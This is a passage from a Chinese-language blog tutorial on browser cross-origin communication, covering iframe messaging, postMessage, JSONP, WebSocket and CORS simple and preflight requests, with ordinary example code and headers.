<p>注意，这种方法只适用于 Cookie 和 iframe 窗口，LocalStorage 和 IndexedDB 无法通过这种方法，规避同源政策，而要使用下文介绍 PostMessage API。</p>
<p>另外，服务器也可以在设置 Cookie 的时候，指定 Cookie 的所属域名为一级域名，比如<code>.example.com</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: key=value; domain=.example.com; path=/</span><br></pre></td></tr></table></figure>
<p>这样的话，二级域名和三级域名不用做任何设置，都可以读取这个 Cookie。</p>
<h4 id="6-3-iframe-和多窗口通信"><a href="#6-3-iframe-和多窗口通信" class="headerlink" title="6.3 iframe 和多窗口通信"></a>6.3 iframe 和多窗口通信</h4><p><code>iframe</code>元素可以在当前网页之中，嵌入其他网页。每个<code>iframe</code>元素形成自己的窗口，即有自己的<code>window</code>对象。<code>iframe</code>窗口之中的脚本，可以获得父窗口和子窗口。但是，只有在同源的情况下，父窗口和子窗口才能通信；如果跨域，就无法拿到对方的 DOM。</p>
<p>比如，父窗口运行下面的命令，如果<code>iframe</code>窗口不是同源，就会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span></span><br><span class="line">.getElementById(<span class="string">&quot;myIFrame&quot;</span>)</span><br><span class="line">.contentWindow</span><br><span class="line">.document</span><br><span class="line"><span class="comment">// Uncaught DOMException: Blocked a frame from accessing a cross-origin frame.</span></span><br></pre></td></tr></table></figure>
<p>上面命令中，父窗口想获取子窗口的 DOM，因为跨域导致报错。</p>
<p>反之亦然，子窗口获取主窗口的 DOM 也会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.parent.document.body</span><br><span class="line"><span class="comment">// 报错</span></span><br></pre></td></tr></table></figure>
<p>这种情况不仅适用于<code>iframe</code>窗口，还适用于<code>window.open</code>方法打开的窗口，只要跨域，父窗口与子窗口之间就无法通信。</p>
<p>如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的<code>document.domain</code>属性，就可以规避同源政策，拿到 DOM。</p>
<p>对于完全不同源的网站，目前有两种方法，可以解决跨域窗口的通信问题。<br>`</p>
<ul>
<li>片段识别符（fragment identifier）</li>
<li>跨文档通信API（Cross-document messaging）<br>`<h5 id="6-3-1-片段识别符"><a href="#6-3-1-片段识别符" class="headerlink" title="6.3.1 片段识别符"></a>6.3.1 片段识别符</h5>片段标识符（fragment identifier）指的是，URL 的<code>#</code>号后面的部分，比如<code>http://example.com/x.html#fragment</code>的<code>#fragment</code>。如果只是改变片段标识符，页面不会重新刷新。</li>
</ul>
<p>父窗口可以把信息，写入子窗口的片段标识符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> src = originURL + <span class="string">&#x27;#&#x27;</span> + data;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&#x27;myIFrame&#x27;</span>).src = src;</span><br></pre></td></tr></table></figure>
<p>上面代码中，父窗口把所要传递的信息，写入 iframe 窗口的片段标识符。</p>
<p>子窗口通过监听<code>hashchange</code>事件得到通知。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.onhashchange = checkMessage;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkMessage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> message = <span class="built_in">window</span>.location.hash;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同样的，子窗口也可以改变父窗口的片段标识符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">parent.location.href = target + <span class="string">&#x27;#&#x27;</span> + hash;</span><br></pre></td></tr></table></figure>
<h5 id="6-3-2-window-postMessage"><a href="#6-3-2-window-postMessage" class="headerlink" title="6.3.2 window.postMessage()"></a>6.3.2 window.postMessage()</h5><p>上面的这种方法属于破解，HTML5 为了解决这个问题，引入了一个全新的API：跨文档通信 API（Cross-document messaging）。</p>
<p>这个 API 为<code>window</code>对象新增了一个<code>window.postMessage</code>方法，允许跨窗口通信，不论这两个窗口是否同源。举例来说，父窗口<code>aaa.com</code>向子窗口<code>bbb.com</code>发消息，调用<code>postMessage</code>方法就可以了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 父窗口打开一个子窗口</span></span><br><span class="line"><span class="keyword">var</span> popup = <span class="built_in">window</span>.open(<span class="string">&#x27;http://bbb.com&#x27;</span>, <span class="string">&#x27;title&#x27;</span>);</span><br><span class="line"><span class="comment">// 父窗口向子窗口发消息</span></span><br><span class="line">popup.postMessage(<span class="string">&#x27;Hello World!&#x27;</span>, <span class="string">&#x27;http://bbb.com&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><code>postMessage</code>方法的第一个参数是具体的信息内容，第二个参数是接收消息的窗口的源（origin），即“协议 + 域名 + 端口”。也可以设为<code>*</code>，表示不限制域名，向所有窗口发送。</p>
<p>子窗口向父窗口发送消息的写法类似。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 子窗口向父窗口发消息</span></span><br><span class="line"><span class="built_in">window</span>.opener.postMessage(<span class="string">&#x27;Nice to see you&#x27;</span>, <span class="string">&#x27;http://aaa.com&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>父窗口和子窗口都可以通过<code>message</code>事件，监听对方的消息。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 父窗口和子窗口都可以用下面的代码，</span></span><br><span class="line"><span class="comment">// 监听 message 消息</span></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;message&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e.data);</span><br><span class="line">&#125;,<span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p><code>message</code>事件的参数是事件对象<code>event</code>，提供以下三个属性。</p>
<ul>
<li><code>event.source</code>：发送消息的窗口</li>
<li><code>event.origin</code>: 消息发向的网址</li>
<li><code>event.data</code>: 消息内容</li>
</ul>
<p>下面的例子是，子窗口通过<code>event.source</code>属性引用父窗口，然后发送消息。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;message&#x27;</span>, receiveMessage);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">receiveMessage</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  event.source.postMessage(<span class="string">&#x27;Nice to see you!&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码有几个地方需要注意。首先，<code>receiveMessage</code>函数里面没有过滤信息的来源，任意网址发来的信息都会被处理。其次，<code>postMessage</code>方法中指定的目标窗口的网址是一个星号，表示该信息可以向任意网址发送。通常来说，这两种做法是不推荐的，因为不够安全，可能会被恶意利用。</p>
<p><code>event.origin</code>属性可以过滤不是发给本窗口的消息。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;message&#x27;</span>, receiveMessage);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">receiveMessage</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (event.origin !== <span class="string">&#x27;http://aaa.com&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (event.data === <span class="string">&#x27;Hello World&#x27;</span>) &#123;</span><br><span class="line">    event.source.postMessage(<span class="string">&#x27;Hello&#x27;</span>, event.origin);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(event.data);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="6-3-3-LocalStorage"><a href="#6-3-3-LocalStorage" class="headerlink" title="6.3.3 LocalStorage"></a>6.3.3 LocalStorage</h6><p>通过<code>window.postMessage</code>，读写其他窗口的 LocalStorage 也成为了可能。</p>
<p>下面是一个例子，主窗口写入 iframe 子窗口的<code>localStorage</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (e.origin !== <span class="string">&#x27;http://bbb.com&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> payload = <span class="built_in">JSON</span>.parse(e.data);</span><br><span class="line">  <span class="built_in">localStorage</span>.setItem(payload.key, <span class="built_in">JSON</span>.stringify(payload.data));</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>上面代码中，子窗口将父窗口发来的消息，写入自己的 LocalStorage。</p>
<p>父窗口发送消息的代码如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> win = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;iframe&#x27;</span>)[<span class="number">0</span>].contentWindow;</span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">name</span>: <span class="string">&#x27;Jack&#x27;</span> &#125;;</span><br><span class="line">win.postMessage(</span><br><span class="line">  <span class="built_in">JSON</span>.stringify(&#123;<span class="attr">key</span>: <span class="string">&#x27;storage&#x27;</span>, <span class="attr">data</span>: obj&#125;),</span><br><span class="line">  <span class="string">&#x27;http://bbb.com&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>加强版的子窗口接收消息的代码如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (e.origin !== <span class="string">&#x27;http://bbb.com&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">var</span> payload = <span class="built_in">JSON</span>.parse(e.data);</span><br><span class="line">  <span class="keyword">switch</span> (payload.method) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;set&#x27;</span>:</span><br><span class="line">      <span class="built_in">localStorage</span>.setItem(payload.key, <span class="built_in">JSON</span>.stringify(payload.data));</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;get&#x27;</span>:</span><br><span class="line">      <span class="keyword">var</span> parent = <span class="built_in">window</span>.parent;</span><br><span class="line">      <span class="keyword">var</span> data = <span class="built_in">localStorage</span>.getItem(payload.key);</span><br><span class="line">      parent.postMessage(data, <span class="string">&#x27;http://aaa.com&#x27;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;remove&#x27;</span>:</span><br><span class="line">      <span class="built_in">localStorage</span>.removeItem(payload.key);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>加强版的父窗口发送消息代码如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> win = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;iframe&#x27;</span>)[<span class="number">0</span>].contentWindow;</span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">name</span>: <span class="string">&#x27;Jack&#x27;</span> &#125;;</span><br><span class="line"><span class="comment">// 存入对象</span></span><br><span class="line">win.postMessage(</span><br><span class="line">  <span class="built_in">JSON</span>.stringify(&#123;<span class="attr">key</span>: <span class="string">&#x27;storage&#x27;</span>, <span class="attr">method</span>: <span class="string">&#x27;set&#x27;</span>, <span class="attr">data</span>: obj&#125;),</span><br><span class="line">  <span class="string">&#x27;http://bbb.com&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">// 读取对象</span></span><br><span class="line">win.postMessage(</span><br><span class="line">  <span class="built_in">JSON</span>.stringify(&#123;<span class="attr">key</span>: <span class="string">&#x27;storage&#x27;</span>, <span class="attr">method</span>: <span class="string">&quot;get&quot;</span>&#125;),</span><br><span class="line">  <span class="string">&quot;*&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="built_in">window</span>.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (e.origin != <span class="string">&#x27;http://aaa.com&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">JSON</span>.parse(e.data).name);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="6-4-AJAX"><a href="#6-4-AJAX" class="headerlink" title="6.4 AJAX"></a>6.4 AJAX</h4><p>同源政策规定，AJAX 请求只能发给同源的网址，否则就报错。</p>
<p>除了架设服务器代理（浏览器请求同源服务器，再由后者请求外部服务），有三种方法规避这个限制。</p>
<ul>
<li>JSONP</li>
<li>WebSocket</li>
<li>CORS</li>
</ul>
<h5 id="6-4-1-JSONP"><a href="#6-4-1-JSONP" class="headerlink" title="6.4.1 JSONP"></a>6.4.1 JSONP</h5><p>JSONP 是服务器与客户端跨源通信的常用方法。最大特点就是简单易用，没有兼容性问题，老式浏览器全部支持，服务端改造非常小。</p>
<p>它的做法如下。</p>
<p>第一步，网页添加一个<code>&lt;script&gt;</code>元素，向服务器请求一个脚本，这不受同源政策限制，可以跨域请求。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://api.foo.com?callback=bar&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>注意，请求的脚本网址有一个<code>callback</code>参数（<code>?callback=bar</code>），用来告诉服务器，客户端的回调函数名称（<code>bar</code>）。</p>
<p>第二步，服务器收到请求后，拼接一个字符串，将 JSON 数据放在函数名里面，作为字符串返回（<code>bar(&#123;...&#125;)</code>）。</p>
<p>第三步，客户端会将服务器返回的字符串，作为代码解析，因为浏览器认为，这是<code>&lt;script&gt;</code>标签请求的脚本内容。这时，客户端只要定义了<code>bar()</code>函数，就能在该函数体内，拿到服务器返回的 JSON 数据。</p>
<p>下面看一个实例。首先，网页动态插入<code>&lt;script&gt;</code>元素，由它向跨域网址发出请求。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addScriptTag</span>(<span class="params">src</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">  script.setAttribute(<span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;text/javascript&#x27;</span>);</span><br><span class="line">  script.src = src;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(script);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  addScriptTag(<span class="string">&#x27;http://example.com/ip?callback=foo&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Your public IP address is: &#x27;</span> + data.ip);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>上面代码通过动态添加<code>&lt;script&gt;</code>元素，向服务器<code>example.com</code>发出请求。注意，该请求的查询字符串有一个<code>callback</code>参数，用来指定回调函数的名字，这对于 JSONP 是必需的。</p>
<p>服务器收到这个请求以后，会将数据放在回调函数的参数位置返回。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">foo(&#123;</span><br><span class="line">  <span class="string">&#x27;ip&#x27;</span>: <span class="string">&#x27;8.8.8.8&#x27;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>由于<code>&lt;script&gt;</code>元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了<code>foo</code>函数，该函数就会立即调用。作为参数的 JSON 数据被视为 JavaScript 对象，而不是字符串，因此避免了使用<code>JSON.parse</code>的步骤。</p>
<h5 id="6-4-2-WebSocket"><a href="#6-4-2-WebSocket" class="headerlink" title="6.4.2 WebSocket"></a>6.4.2 WebSocket</h5><p>WebSocket 是一种通信协议，使用<code>ws://</code>（非加密）和<code>wss://</code>（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。</p>
<p>下面是一个例子，浏览器发出的 WebSocket 请求的头信息（摘自维基百科）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">GET /chat HTTP/<span class="number">1.1</span></span><br><span class="line">Host: server.example.com</span><br><span class="line">Upgrade: websocket</span><br><span class="line">Connection: Upgrade</span><br><span class="line">Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==</span><br><span class="line">Sec-WebSocket-Protocol: chat, superchat</span><br><span class="line">Sec-WebSocket-Version: <span class="number">13</span></span><br><span class="line">Origin: http:<span class="comment">//example.com</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，有一个字段是<code>Origin</code>，表示该请求的请求源（origin），即发自哪个域名。</p>
<p>正是因为有了<code>Origin</code>这个字段，所以 WebSocket 才没有实行同源政策。因为服务器可以根据这个字段，判断是否许可本次通信。如果该域名在白名单内，服务器就会做出如下回应。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">101</span> Switching Protocols</span><br><span class="line">Upgrade: websocket</span><br><span class="line">Connection: Upgrade</span><br><span class="line">Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=</span><br><span class="line">Sec-WebSocket-Protocol: chat</span><br></pre></td></tr></table></figure>
<h5 id="6-4-3-CORS"><a href="#6-4-3-CORS" class="headerlink" title="6.4.3 CORS"></a>6.4.3 CORS</h5><p>CORS 是跨源资源分享（Cross-Origin Resource Sharing）的缩写。它是 W3C 标准，属于跨源 AJAX 请求的根本解决方法。相比 JSONP 只能发<code>GET</code>请求，CORS 允许任何类型的请求。</p>
<p>下一章将详细介绍，如何通过 CORS 完成跨源 AJAX 请求。</p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS 浏览器模型-同源限制</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0061</title>
    <url>/2021/06/02/%E6%89%93%E5%8D%A10061/</url>
    <content><![CDATA[<p><font color=#2f271d>修炼匠心，在重复的岁月里，对得起每一寸光阴。</font></p>
<h2 id="JS-浏览器模型"><a href="#JS-浏览器模型" class="headerlink" title="JS 浏览器模型"></a>JS 浏览器模型</h2><h3 id="7-CORS-通信"><a href="#7-CORS-通信" class="headerlink" title="7. CORS 通信"></a>7. CORS 通信</h3><p>CORS 是一个 W3C 标准，全称是“跨域资源共享”（Cross-origin resource sharing）。它允许浏览器向跨域的服务器，发出<code>XMLHttpRequest</code>请求，从而克服了 AJAX 只能同源使用的限制。</p>
<h4 id="7-1-简介"><a href="#7-1-简介" class="headerlink" title="7.1 简介"></a>7.1 简介</h4><p>CORS 需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能。</p>
<p>整个 CORS 通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS 通信与普通的 AJAX 通信没有差别，代码完全一样。浏览器一旦发现 AJAX 请求跨域，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感知。因此，实现 CORS 通信的关键是服务器。只要服务器实现了 CORS 接口，就可以跨域通信。</p>
<h4 id="7-2-两种请求"><a href="#7-2-两种请求" class="headerlink" title="7.2 两种请求"></a>7.2 两种请求</h4><p>CORS 请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。</p>
<p>只要同时满足以下两大条件，就属于简单请求。</p>
<p>（1）请求方法是以下三种方法之一。</p>
<ul>
<li>HEAD</li>
<li>GET</li>
<li>POST</li>
</ul>
<p>（2）HTTP 的头信息不超出以下几种字段。</p>
<ul>
<li>Accept</li>
<li>Accept-Language</li>
<li>Content-Language</li>
<li>Last-Event-ID</li>
<li>Content-Type：只限于三个值<code>application/x-www-form-urlencoded</code>、<code>multipart/form-data</code>、<code>text/plain</code></li>
</ul>
<span id="more"></span>
<p>凡是不同时满足上面两个条件，就属于非简单请求。一句话，简单请求就是简单的 HTTP 方法与简单的 HTTP 头信息的结合。</p>
<p>这样划分的原因是，表单在历史上一直可以跨域发出请求。简单请求就是表单请求，浏览器沿袭了传统的处理方式，不把行为复杂化，否则开发者可能转而使用表单，规避 CORS 的限制。对于非简单请求，浏览器会采用新的处理方式。</p>
<h4 id="7-3-简单请求"><a href="#7-3-简单请求" class="headerlink" title="7.3 简单请求"></a>7.3 简单请求</h4><h5 id="7-3-1-基本流程"><a href="#7-3-1-基本流程" class="headerlink" title="7.3.1 基本流程"></a>7.3.1 基本流程</h5><p>对于简单请求，浏览器直接发出 CORS 请求。具体来说，就是在头信息之中，增加一个<code>Origin</code>字段。</p>
<p>下面是一个例子，浏览器发现这次跨域 AJAX 请求是简单请求，就自动在头信息之中，添加一个<code>Origin</code>字段。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">GET /cors HTTP/<span class="number">1.1</span></span><br><span class="line">Origin: http:<span class="comment">//api.bob.com</span></span><br><span class="line">Host: api.alice.com</span><br><span class="line">Accept-Language: en-US</span><br><span class="line">Connection: keep-alive</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span>...</span><br></pre></td></tr></table></figure>
<p>上面的头信息中，<code>Origin</code>字段用来说明，本次请求来自哪个域（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。</p>
<p>如果<code>Origin</code>指定的源，不在许可范围内，服务器会返回一个正常的 HTTP 回应。浏览器发现，这个回应的头信息没有包含<code>Access-Control-Allow-Origin</code>字段（详见下文），就知道出错了，从而抛出一个错误，被<code>XMLHttpRequest</code>的<code>onerror</code>回调函数捕获。注意，这种错误无法通过状态码识别，因为 HTTP 回应的状态码有可能是200。</p>
<p>如果<code>Origin</code>指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http:<span class="comment">//api.bob.com</span></span><br><span class="line">Access-Control-Allow-Credentials: <span class="literal">true</span></span><br><span class="line">Access-Control-Expose-Headers: FooBar</span><br><span class="line">Content-Type: text/html; charset=utf-<span class="number">8</span></span><br></pre></td></tr></table></figure>
<p>上面的头信息之中，有三个与 CORS 请求相关的字段，都以<code>Access-Control-</code>开头。</p>
<h6 id="（1）Access-Control-Allow-Origin"><a href="#（1）Access-Control-Allow-Origin" class="headerlink" title="（1）Access-Control-Allow-Origin"></a>（1）Access-Control-Allow-Origin</h6><p>该字段是必须的。它的值要么是请求时<code>Origin</code>字段的值，要么是一个<code>*</code>，表示接受任意域名的请求。</p>
<h6 id="（2）Access-Control-Allow-Credentials"><a href="#（2）Access-Control-Allow-Credentials" class="headerlink" title="（2）Access-Control-Allow-Credentials"></a>（2）Access-Control-Allow-Credentials</h6><p>该字段可选。它的值是一个布尔值，表示是否允许发送 Cookie。默认情况下，Cookie 不包括在 CORS 请求之中。设为<code>true</code>，即表示服务器明确许可，浏览器可以把 Cookie 包含在请求中，一起发给服务器。这个值也只能设为<code>true</code>，如果服务器不要浏览器发送 Cookie，不发送该字段即可。</p>
<h6 id="（3）Access-Control-Expose-Headers"><a href="#（3）Access-Control-Expose-Headers" class="headerlink" title="（3）Access-Control-Expose-Headers"></a>（3）Access-Control-Expose-Headers</h6><p>该字段可选。CORS 请求时，<code>XMLHttpRequest</code>对象的<code>getResponseHeader()</code>方法只能拿到6个服务器返回的基本字段：<code>Cache-Control</code>、<code>Content-Language</code>、<code>Content-Type</code>、<code>Expires</code>、<code>Last-Modified</code>、<code>Pragma</code>。如果想拿到其他字段，就必须在<code>Access-Control-Expose-Headers</code>里面指定。上面的例子指定，<code>getResponseHeader(&#39;FooBar&#39;)</code>可以返回<code>FooBar</code>字段的值。</p>
<h5 id="7-3-2-withCredentials-属性"><a href="#7-3-2-withCredentials-属性" class="headerlink" title="7.3.2 withCredentials 属性"></a>7.3.2 withCredentials 属性</h5><p>上面说到，CORS 请求默认不包含 Cookie 信息（以及 HTTP 认证信息等），这是为了降低 CSRF 攻击的风险。但是某些场合，服务器可能需要拿到 Cookie，这时需要服务器显式指定<code>Access-Control-Allow-Credentials</code>字段，告诉浏览器可以发送 Cookie。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Credentials: <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>同时，开发者必须在 AJAX 请求中打开<code>withCredentials</code>属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.withCredentials = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
<p>否则，即使服务器要求发送 Cookie，浏览器也不会发送。或者，服务器要求设置 Cookie，浏览器也不会处理。</p>
<p>但是，有的浏览器默认将<code>withCredentials</code>属性设为<code>true</code>。这导致如果省略<code>withCredentials</code>设置，这些浏览器可能还是会一起发送 Cookie。这时，可以显式关闭<code>withCredentials</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">xhr.withCredentials = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>
<p>需要注意的是，如果服务器要求浏览器发送 Cookie，<code>Access-Control-Allow-Origin</code>就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie 依然遵循同源政策，只有用服务器域名设置的 Cookie 才会上传，其他域名的 Cookie 并不会上传，且（跨域）原网页代码中的<code>document.cookie</code>也无法读取服务器域名下的 Cookie。</p>
<h4 id="7-4-非简单请求"><a href="#7-4-非简单请求" class="headerlink" title="7.4 非简单请求"></a>7.4 非简单请求</h4><h5 id="7-4-1-预检请求"><a href="#7-4-1-预检请求" class="headerlink" title="7.4.1 预检请求"></a>7.4.1 预检请求</h5><p>非简单请求是那种对服务器提出特殊要求的请求，比如请求方法是<code>PUT</code>或<code>DELETE</code>，或者<code>Content-Type</code>字段的类型是<code>application/json</code>。</p>
<p>非简单请求的 CORS 请求，会在正式通信之前，增加一次 HTTP 查询请求，称为“预检”请求（preflight）。浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些 HTTP 方法和头信息字段。只有得到肯定答复，浏览器才会发出正式的<code>XMLHttpRequest</code>请求，否则就报错。这是为了防止这些新增的请求，对传统的没有 CORS 支持的服务器形成压力，给服务器一个提前拒绝的机会，这样可以防止服务器收到大量<code>DELETE</code>和<code>PUT</code>请求，这些传统的表单不可能跨域发出的请求。</p>
<p>下面是一段浏览器的 JavaScript 脚本。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;http://api.alice.com/cors&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">&#x27;PUT&#x27;</span>, url, <span class="literal">true</span>);</span><br><span class="line">xhr.setRequestHeader(<span class="string">&#x27;X-Custom-Header&#x27;</span>, <span class="string">&#x27;value&#x27;</span>);</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>
<p>上面代码中，HTTP 请求的方法是<code>PUT</code>，并且发送一个自定义头信息<code>X-Custom-Header</code>。</p>
<p>浏览器发现，这是一个非简单请求，就自动发出一个“预检”请求，要求服务器确认可以这样请求。下面是这个“预检”请求的 HTTP 头信息。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">OPTIONS /cors HTTP/<span class="number">1.1</span></span><br><span class="line">Origin: http:<span class="comment">//api.bob.com</span></span><br><span class="line">Access-Control-Request-Method: PUT</span><br><span class="line">Access-Control-Request-Headers: X-Custom-Header</span><br><span class="line">Host: api.alice.com</span><br><span class="line">Accept-Language: en-US</span><br><span class="line">Connection: keep-alive</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span>...</span><br></pre></td></tr></table></figure>
<p>“预检”请求用的请求方法是<code>OPTIONS</code>，表示这个请求是用来询问的。头信息里面，关键字段是<code>Origin</code>，表示请求来自哪个源。</p>
<p>除了<code>Origin</code>字段，“预检”请求的头信息包括两个特殊字段。</p>
<h6 id="1-Access-Control-Request-Method"><a href="#1-Access-Control-Request-Method" class="headerlink" title="(1)Access-Control-Request-Method"></a>(1)Access-Control-Request-Method</h6><p>该字段是必须的，用来列出浏览器的 CORS 请求会用到哪些 HTTP 方法，上例是<code>PUT</code>。</p>
<h6 id="2-Access-Control-Request-Headers"><a href="#2-Access-Control-Request-Headers" class="headerlink" title="(2)Access-Control-Request-Headers"></a>(2)Access-Control-Request-Headers</h6><p>该字段是一个逗号分隔的字符串，指定浏览器 CORS 请求会额外发送的头信息字段，上例是<code>X-Custom-Header</code>。</p>
<h5 id="7-4-2-预检请求的回应"><a href="#7-4-2-预检请求的回应" class="headerlink" title="7.4.2 预检请求的回应"></a>7.4.2 预检请求的回应</h5><p>服务器收到“预检”请求以后，检查了<code>Origin</code>、<code>Access-Control-Request-Method</code>和<code>Access-Control-Request-Headers</code>字段以后，确认允许跨源请求，就可以做出回应。</p>
